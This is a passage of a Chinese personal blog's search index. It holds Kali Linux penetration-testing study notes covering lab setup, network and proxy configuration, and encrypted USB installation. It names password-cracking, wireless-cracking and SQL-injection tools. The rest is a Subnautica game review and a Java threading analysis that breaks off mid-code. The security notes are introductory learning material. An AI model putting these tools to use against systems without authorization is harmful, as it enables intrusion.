            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试实验环境搭建</title>
      <link href="/2020/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
      <url>/2020/08/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E9%AA%8C%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
      
        <content type="html"><![CDATA[<ul><li>Windows</li><li>Redhat、Ubuntu<ul><li>安装LAMP</li></ul></li><li>Metasploitable</li><li>m0n0wall<a id="more"></a>下面这个地址的虚拟机环境本是用于测试其中的应用<br><a href="https://www.turnkeylinux.org/" target="_blank" rel="noopener">https://www.turnkeylinux.org/</a><br>win10地址<br><a href="https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/" target="_blank" rel="noopener">https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali定制</title>
      <link href="/2020/08/21/Kali%E5%AE%9A%E5%88%B6/"/>
      <url>/2020/08/21/Kali%E5%AE%9A%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<p>新安装Kali后需要做的一些操作</p><a id="more"></a><h1 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">dhclient etho &#x2F;&#x2F;动态分配路由<br>ifconfig eth0 192.168.1.10&#x2F;24 &#x2F;&#x2F;指定路由<br>route add default gw 192.168.1.1 &#x2F;&#x2F;指定网关<br>route add -net 172.16.1.0&#x2F;24 gw 192.168.1.100 eth0&#x2F;&#x2F;指定网段的网关和出口网卡<br>netstat -nr &#x2F;&#x2F;查看<br>vi &#x2F;etc&#x2F;resolv.conf &#x2F;&#x2F;修改DNS<br></code></pre></td></tr></table></figure><p>以上修改重启后会失效，如果想要长期有效，需要编辑网卡配置文件/etc/network/interfaces</p><h1 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h1><p>先修改为国内源地址</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get update<br>apt-get upgrade<br></code></pre></td></tr></table></figure><h1 id="安装适合自己的工具软件"><a href="#安装适合自己的工具软件" class="headerlink" title="安装适合自己的工具软件"></a>安装适合自己的工具软件</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">- apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule amule qbittorrent geany stardict meld meld ttf-wqy-microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y<br></code></pre></td></tr></table></figure><h1 id="firefox浏览器插件"><a href="#firefox浏览器插件" class="headerlink" title="firefox浏览器插件"></a>firefox浏览器插件</h1><ul><li>flashgot、autoproxy、TamperData、cookie、importer、CookiesManager、User Agent、Switcher、HackBar、Live http header、FireBug、Download YouTube Videos as MP4、Flagfox、hashr、XSS Me、SQL Inject Me</li></ul><h1 id="显卡驱动-密码破解"><a href="#显卡驱动-密码破解" class="headerlink" title="显卡驱动(密码破解)"></a>显卡驱动(密码破解)</h1><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plain">apt-get dist-upgrade<br>apt-get install -y linux-headers-$&#123;uname -r&#125;<br>apt-get install nvidia-kernel-dkms<br><br>sed &#39;s&#x2F;quiet&#x2F;quiet nouveau.modeset&#x3D;0&#x2F;g&#39; -i &#x2F;etc&#x2F;default&#x2F;grub<br>update-grub<br>reboot<br></code></pre></td></tr></table></figure><ul><li>验证：<ul><li>glxinfo|grep -i “direct rendering”<ul><li>direct rendering:Yes</li></ul></li></ul></li></ul><h1 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h1><ul><li>ulimit用于限制当前shell内进程的资源使用</li><li>查看默认值<ul><li>ulimit -a</li></ul></li><li>全局配置文件：/etc/security/limits</li><li>用途<ul><li>限制堆栈大小：ulimit -s 100</li><li>限制shell内存使用：ulimit -m 5000 -v 5000</li></ul></li><li>没有直接对socket数量的限制参数<ul><li>Linux系统中一切都是文件，运行中的文件叫做进程</li><li>ulimite -n 800000</li></ul></li></ul><h1 id="笔记本模式"><a href="#笔记本模式" class="headerlink" title="笔记本模式"></a>笔记本模式</h1><ul><li>自行搜索</li></ul><h1 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h1><ul><li>Kali默认未启动所有网络服务</li></ul><p>/etc/init.d/下有各种服务的启动脚本<br>例：启动ssh</p><figure class="hljs highlight plain"><figcaption><span>start```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ./ssh">如果想下次重启后还启动ssh<br>&#96;&#96;&#96;update-rc.d ssh default<br></code></pre></td></tr></table></figure><p>default 会在 2 3 4 5运行级别启动，0 1 6关闭</p><figure class="hljs highlight plain"><figcaption><span>A defaults 80 20```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs update-rc.d">A服务启动的优先级是80 关闭的优先级是20，优先级数字小的先执行。<br><br># GFW长城防火墙<br><br>-翻墙<br>  - http代理（明文传输）<br>  - socks代理<br>  - ssh隧道<br>  - <br><br>- Goagent<br>- Tor<br>  - tor project<br>  - wiki地址：<br>    - zqktlwi4fecvo6ri.onion&#x2F;<br>    - zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion&#x2F;<br><br>- 代理的意义所在<br>  - 加密信息<br>  - 隐藏来源<br>  - 突破网络封锁<br><br>- 注意事项<br>  - 不要触及敏感地带<br>  - 不要从事非法行为<br><br>  例：<br>  给apt-get设置代理<br>  &#x2F;etc&#x2F;apt&#x2F;apt.conf<br></code></pre></td></tr></table></figure><p>  Acquire::ftp::Proxy “<a href="ftp://127.0.0.1:8087/&quot;">ftp://127.0.0.1:8087/&quot;</a><br>  Acquire::http::Proxy “<a href="http://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">http://127.0.0.1:8087/&quot;</a><br>  Acquire::https::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  Acquire::socks::Proxy “<a href="https://127.0.0.1:8087/&quot;" target="_blank" rel="noopener">https://127.0.0.1:8087/&quot;</a><br>  <figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain"><br>&#x2F;etc&#x2F;bash.bashrc<br></code></pre></td></tr></table></figure><br>  export ftp_proxy=”<a href="ftp://user:password@proxyIP:port&quot;">ftp://user:password@proxyIP:port&quot;</a><br>         http_proxy<br>         https_proxy<br>         socks_proxy</p><p>  ```</p><h3 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h3><p>/etc/proxychains.conf</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试及Kali初探</title>
      <link href="/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/"/>
      <url>/2020/08/19/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%88%9D%E6%8E%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试标准PETS"><a href="#渗透测试标准PETS" class="headerlink" title="渗透测试标准PETS"></a>渗透测试标准<a href="http://www.pentest-standard.org" target="_blank" rel="noopener">PETS</a></h1><ul><li>前期交互阶段（与客户沟通，确定测试范围，测试方式，时间等。）</li><li>情报收集阶段</li><li>威胁建模阶段（分析，确定最可行的攻击通道。）</li><li>漏洞分析阶段</li><li>渗透攻击阶段</li><li>后渗透测试阶段（尽可能展现威胁影响程度）</li><li>渗透测试报告<a id="more"></a></li></ul><hr><h1 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h1><ul><li>Kali命名参考印度神话</li><li>基于Debian,前身是2013年3月发布的BackTrack</li><li>用于渗透测试和安全审计</li><li>包含600+安全工具</li><li>FHS标准目录结构</li><li><ul><li>BackTrack将所有相关工具放在/pentest目录下，下分更细目录如web,database，有些工具很难界定放在哪个目录。</li></ul></li><li>定制内核（关于无线驱动）</li><li>支持ARM和手机平台（Nethunter）</li><li>开源免费（Offensi Security）</li></ul><h1 id="Kali-Linux策略"><a href="#Kali-Linux策略" class="headerlink" title="Kali Linux策略"></a>Kali Linux策略</h1><ul><li>Root用户策略（默认root）</li><li>网络服务策略（默认全部关闭，新装软件默认启动脚本不启动，需要用update.rc.d命令）</li><li>更新升级策略（随Debian,Offensive Security维护工具。）</li></ul><h1 id="Kali-VirtualBox-环境搭建"><a href="#Kali-VirtualBox-环境搭建" class="headerlink" title="Kali VirtualBox 环境搭建"></a>Kali VirtualBox 环境搭建</h1><ol><li>首先下载kali官方的VirtualBox镜像。</li><li>默认用户名密码是kali/kali,切换root用<code>sudo su</code></li><li><code>apt-get update</code></li><li><code>apt-get install linux-headers-$(uname -r)</code></li><li>安装VirtualBox增强，点击Devices–&gt;Insert GuestAdditons CD image,在桌面会出现一个光盘图标的文件。<br>运行其中对应的.run文件。</li></ol><h1 id="Kali-持久加密USB安装"><a href="#Kali-持久加密USB安装" class="headerlink" title="Kali 持久加密USB安装"></a>Kali 持久加密USB安装</h1><ol><li>VirtualBox共享Windows文件夹，将kali镜像放入其中</li><li>插入U盘</li><li>使用dmesg命令查看U盘名称（例：”sdb”）</li><li>使用GParted将sdb分区删除</li><li>使用dd命令将镜像按块写入U盘(使用watch命令查看进度，每5秒发送一次SIGUSR1信号)</li><li>使用parted从上一分区结束位置创建分区</li><li>使用LUKS加密分区<code>cryptsetup --verbose --verify-passphrase luksFormat /dev/sdb</code></li><li>打开加密分区<code>cryptsetup luksOpen /dev/sdb3 usb</code></li><li>mkfs.ext4 /dev/mapper/usb将分区格式化成ext4</li><li>e2label /dev/mapper/usb persistence将分区卷标指定为persistence（必须是persistence——持久化的意思</li><li>完成后，在mnt目录下创建一个文件夹，将分区挂载到该文件夹处，并填入配置文件。完成后卸掉挂载，并关闭加密区。</li></ol><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plain">mkdir -p &#x2F;mnt&#x2F;kali<br>mount &#x2F;dev&#x2F;mapper&#x2F;kali &#x2F;mnt&#x2F;kali<br>echo &quot;&#x2F; union&quot; &gt; &#x2F;mnt&#x2F;kali&#x2F;persistence.conf<br>umount &#x2F;dev&#x2F;mapper&#x2F;kali<br>cryptsetup luksClose &#x2F;dev&#x2F;mapper&#x2F;kali<br></code></pre></td></tr></table></figure><h1 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h1><ul><li>nmap            网络发现</li><li>burpsuit         http请求中间人</li><li>zap            http请求中间人</li><li>sqlmap        SQL注入</li><li>aircrack-ng    无线破解</li><li>metasploit    渗透测试框架</li><li>maltego        信息收集</li><li>john            密码破解</li><li>hydra            密码破解</li><li>wireshark        抓包</li></ul><p>实时流量显示 NetSpeed</p><p>#学习</p><ul><li>实践是最好的老师，加油。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>点击上方的关于查看我的更多信息</title>
      <link href="/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/"/>
      <url>/2020/08/18/%E7%82%B9%E5%87%BB%E4%B8%8A%E6%96%B9%E7%9A%84%E5%85%B3%E4%BA%8E%E6%9F%A5%E7%9C%8B%E6%88%91%E7%9A%84%E6%9B%B4%E5%A4%9A%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<p>有些时间没有写博客了(惭愧)，点<a href="https://pyrrhax.com/about/" target="_blank" rel="noopener">这里</a> 了解我吧</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>We are different,but we go together ----《深海迷航》</title>
      <link href="/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/"/>
      <url>/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/</url>
      
        <content type="html"><![CDATA[<p><img src="/2019/01/24/We%20are%20different,but%20we%20go%20together%20----%E3%80%8A%E6%B7%B1%E6%B5%B7%E8%BF%B7%E8%88%AA%E3%80%8B/leviathan.png" alt><br><strong>What is a wave without the ocean,a begining without the end.</strong><br><strong>They are different,but they go together.</strong><br><strong>Now you go among the stars,and I fall among the sands.</strong><br><strong>We are different,but we go together.</strong></p><a id="more"></a><p>第一次感到对大海的恐惧，是在洛圣都开着快艇来到地图边界。天空布满灰色的乌云，环顾四周也看不到一片陆地，尽是波涛汹涌的海水。快艇随着大海蓝黑泛白的涟漪上下起伏。船慢慢沉入水中。只好游泳，水中永远是深蓝不见底，越往深处光线越暗。没有多久就被鲨鱼攻击，然后死掉了。压抑，恐惧，无助。我不知道是幽闭恐惧还是深海恐惧，这种感觉在之后的一段时间，一直让我记忆犹新。<br>后来偶然听闻有某游戏专治“深海恐惧”，我不由得又想到了这种体验。忍不住下载然后尝试。（当时是2016年，游戏还在开发阶段，虽然相比于现在有一些不足，但也都无关紧要。）<br>故事的开始主角已经进入了星际飞船“极光号”的救生舱，随着极光号的坠落，十几个逃生舱也散落在4546B这个绝大部分都是海洋的星球上。为了等待救援，不得不开始探索周边环境。看得出来这是科技非常发达的时代，主角借助PDA，配合光谱扫描仪，一点一点了解周边生态环境。也就是在这个过程中，发现了这个星球上更多的秘密。<br>身上有绿色斑点的各种生物，外星进水排水设施，嘉德斯号船员的遗址，极光号受到的未能分析出结果的损伤形式。逐渐让主角对这个星球的故事产生好奇。<br>不得不让人称赞的是这个游戏的音乐和音效。让人印象深刻的是暗礁鱼低沉悠长的叫声，让人听到就觉得孤独。深潜时捕食者的咆哮也给游戏增添了一丝紧张感。在浅水区，绿藻区，树蘑菇林，失落之河……每个区域都有独特的风景。精心设计的地图，相比于随机生成更加有美感。场景切换时的音乐，也和环境氛围完美融合。代入感极佳。<br>开始玩了大概有20多个小时，因为感到深深的孤独，就没有勇气继续玩下去了。（在后来的版本，开发商为了减轻玩家的这种痛苦，增加了一个可爱的抱抱鱼作为宠物qwq）<br>直到两年后，我又重新拾起了这个游戏。在这之间，它已经由完美世界发行，并收入WeGame平台之中，在游戏发售后IGN 也给出了9.1 Amazing的高分,也被游民星空评价为开放世界生存游戏的典范。<br>在游戏中最让我感兴趣的部分是扫描各种未知的生物。它们以各种奇妙的方式来运动，进食，共生，等等，完成自己的生命周期。<br>包括显示出重度基因修正和多处机械移植迹象的生命形式——裂空者，有机体和高科技的完美结合造就了这种强力且危险的生物。<br>随着剧情的一步步推进，主角在这个星球上收到海皇心电感应发来的讯息，让这个孤独的世界不那么孤独。玩到这里的时候，已经满脑子都是“我要见到海皇”这种想法了。<br>当主角终于找到离开的方法时，这个巨大却温柔生物却不得不走向生命的终结。<br><strong>We are different,but we go together.</strong><br>事情总是这样，不过，可以相遇就已经足够了，不是吗。<br>面对巨大生物时的震撼，各种奇妙的生命形式，面对未知的恐惧和强烈的好奇，和伴随着整个游戏进程的深深孤独感，都是令人着迷的神奇体验。</p>]]></content>
      
      
      <categories>
          
          <category> 游戏 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 科幻 </tag>
            
            <tag> 生存 </tag>
            
            <tag> 沙盒 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于Java多线程两种实现方式的一点想法</title>
      <link href="/2018/09/23/%E5%85%B3%E4%BA%8EJava%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%A4%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/"/>
      <url>/2018/09/23/%E5%85%B3%E4%BA%8EJava%E5%A4%9A%E7%BA%BF%E7%A8%8B%E4%B8%A4%E7%A7%8D%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%E7%9A%84%E4%B8%80%E7%82%B9%E6%83%B3%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>在看某本书的时候里面讲到继承Thread类和实现Runnable接口的区别。有这么一条是说“继承Thread类不能资源共享，而实现Runnable接口可以。”于是产生了以下问题。</p><a id="more"></a><p>书上的代码如下。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*实现Runnable接口可以资源共享<br>*&#x2F;<br>public class ShareResourceTest2 implements Runnable&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest2 srt1 &#x3D; new ShareResourceTest2();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br><br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br></code></pre></td></tr></table></figure><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>* 继承Thread类不能实现资源共享<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        srt1.start();<br>        srt2.start();<br>        srt3.start();<br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源没有共享<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-0卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;...<br>&#x2F;&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;1<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;18<br></code></pre></td></tr></table></figure><p>我一看不对啊，两个main方法都不一样。第一个是创建了一个Runnable然后再用这个Runnable去创建三个新的Thread。第二个直接创建了三个Thread。我陷入了沉思- -，我觉得第二个程序不能资源共享可能是这个main方法的原因，而不是因为继承了Thread类。于是我写了以下代码作为测试。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*继承Thread类，但可以资源共享。<br>*&#x2F;<br>public class ShareResourceTest1 extends Thread&#123;<br>    private int ticket &#x3D;20;<br>    public void run()&#123;<br>        for(int i&#x3D;0;i&lt;100;i++)&#123;<br>            if(ticket&gt;0)&#123;<br>                System.out.println(Thread.currentThread().getName()+&quot;卖票:ticke&#x3D;&quot;+ticket--);<br>            &#125;<br>        &#125;<br>    &#125;<br>    public static void main(String[] args) &#123;<br>        ShareResourceTest1 srt1 &#x3D; new ShareResourceTest1();<br>        Thread t1 &#x3D; new Thread(srt1);<br>        Thread t2 &#x3D; new Thread(srt1);<br>        Thread t3 &#x3D; new Thread(srt1);<br>        t1.start();<br>        t2.start();<br>        t3.start();<br><br>    &#125;<br>&#125;<br>&#x2F;&#x2F;部分输出结果 资源共享<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;20<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;19<br>&#x2F;&#x2F;Thread-1卖票:ticke&#x3D;18<br>&#x2F;&#x2F;Thread-3卖票:ticke&#x3D;17<br>&#x2F;&#x2F;Thread-2卖票:ticke&#x3D;16<br></code></pre></td></tr></table></figure><p>我用这个继承了Thread的类创建了一个对象，然后用它再去创建三个线程，实现了资源共享。证明我的想法没有错，不能资源共享并不是因为它是继承了Thread类。而是因为创建这三个线程的方式。那到底是为什么会造成这种现象呢。<br>两种方式的区别也只有：</p><ul><li>一个是用Thread的无参构造方法构造了三个Thread。</li><li>一个是用Thread的有参构造方法构造了三个Thread。</li></ul><p>于是按ctrl+左键去看看Thread类，发现了这些东西</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>    &#x2F;* For autonumbering anonymous threads. *&#x2F;<br>    private static int threadInitNumber;<br>    &#x2F;* What will be run. *&#x2F;<br>    private Runnable target;<br>&#x2F;&#x2F;...<br>&#x2F;**<br>     * If this thread was constructed using a separate<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; run object, then that<br>     * &lt;code&gt;Runnable&lt;&#x2F;code&gt; object&#39;s &lt;code&gt;run&lt;&#x2F;code&gt; method is called;<br>     * otherwise, this method does nothing and returns.<br>     * &lt;p&gt;<br>     * Subclasses of &lt;code&gt;Thread&lt;&#x2F;code&gt; should override this method.<br>     *<br>     * @see     #start()<br>     * @see     #stop()<br>     * @see     #Thread(ThreadGroup, Runnable, String)<br>     *&#x2F;<br>    @Override<br>    public void run() &#123;<br>        if (target !&#x3D; null) &#123;<br>            target.run();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>于是找到了造成以上三个程序结果的原因：</p><ul><li>注释中的What will be run 是一个 名为target的实现了Runnable接口的对象 。用有参(有target)构造函数构造一个Thread，该线程的run()方法即执行target的run()方法。如果用有参构造函数创建三个线程，并且传入的是同一个实现了Runnable接口的对象，那么这三个线程中的target指向同一个对象。所以这三个线程的对同一个对象进行操作，从而实现资源共享的效果。</li><li>第二个程序用无参构造函数创建线程，则这个target为空，执行Thread本身的run()方法，而这个Thread继承了一个Thread，并重写过run()方法。执行的就是重写过的run()方法。我们创建三个这样的对象，是分别执行每个对象中的run()方法。所以并不能资源共享。</li><li>而第三个程序虽然使用继承的方法重写了Thread的run()方法，但是并没有将这个Thread直接用new实例化来使用。而是用它作为一个Runnable target，重新创建了三个target相同的Thread对象。相当于用继承Thread重写run()方法的方式，来间接地实现Runnable接口= =，然后再创建线程。</li></ul><p>为了再次验证这个想法，我们去找Thread的构造函数。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x2F;**<br>*找到了一大堆构造函数，只贴这两个了- -<br>*&#x2F;<br>public<br>class Thread implements Runnable &#123;<br>&#x2F;&#x2F;...<br>public Thread() &#123;<br>        init(null, null, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>public Thread(Runnable target) &#123;<br>        init(null, target, &quot;Thread-&quot; + nextThreadNum(), 0);<br>    &#125;<br>&#x2F;&#x2F;...<br>&#125;<br></code></pre></td></tr></table></figure><p>发现构造方法其实在用尽可能多的信息去填充init()这个方法的参数，如果没有就填null。<br>（顺便发现线程名称是“Thread-”再加一个数字，这个数字是threadInitNumber++。刚好解释了为什么我们的第三个程序的线程名是从1开始而不是从0开始。因为0被我们创建的第一个Thread占用了）<br>那我们看看init方法的实现</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plain">private void init(ThreadGroup g, Runnable target, String name,<br>                      long stackSize) &#123;<br>        init(g, target, name, stackSize, null, true);<br>    